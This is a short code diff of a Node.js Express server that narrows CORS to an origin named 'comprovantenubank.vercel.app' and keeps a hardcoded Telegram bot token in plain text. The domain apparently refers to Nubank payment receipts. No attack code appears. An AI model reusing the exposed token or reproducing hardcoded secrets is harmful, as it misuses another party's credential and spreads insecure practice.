@@ -1,11 +1,16 @@
-// server.js
 const express = require("express");
 const bodyParser = require("body-parser");
 const cors = require("cors");
 const axios = require("axios");
 
 const app = express();
-app.use(cors());
+
+// Configuração do CORS
+app.use(cors({
+  origin: 'https://comprovantenubank.vercel.app', // Altere conforme necessário
+}));
+
+// Usar o bodyParser para parsear os dados JSON
 app.use(bodyParser.json());
 
 const TELEGRAM_BOT_TOKEN = "7502261188:AAEnUwY-rA1307JXO3R7_O-3o8rZnEpJIJY"; // Substitua pelo token do seu bot
